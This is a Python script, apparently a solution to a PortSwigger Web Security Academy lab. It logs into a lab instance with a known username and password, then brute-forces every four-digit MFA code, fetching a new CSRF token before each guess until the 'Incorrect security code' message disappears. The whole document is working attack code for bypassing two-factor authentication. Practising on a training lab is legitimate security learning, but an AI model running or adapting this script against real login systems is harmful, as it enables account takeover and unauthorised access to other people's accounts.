import requests
from bs4 import BeautifulSoup

url = 'https://aca01f521f57a39bc088ee4600e10064.web-security-academy.net/login'
s = requests.Session()

def getLoginCSRF():
    response = s.get(url)

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']

    return csrf

def getLogin2CSRF():
    response = s.post(url, data={
        'username': 'carlos',
        'password': 'montoya',
        'csrf': getLoginCSRF()
    })

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']

    return csrf

def bruteForceSecurityCode():
    for i in range(0, 10):
        for j in range(0, 10):
            for k in range(0, 10):
                for l in range(0, 10):
                    mfa_code = str(i) + str(j) + str(k) + str(l)
                    csrf = getLogin2CSRF()
                    url = 'https://aca01f521f57a39bc088ee4600e10064.web-security-academy.net/login2'

                    response = s.post(url, data={
                        'mfa-code': mfa_code,
                        'csrf': csrf
                    })

                    print(mfa_code)

                    if 'Incorrect security code' not in response.text:
                        print(response.text)
                        print(mfa_code)
                        exit()

bruteForceSecurityCode()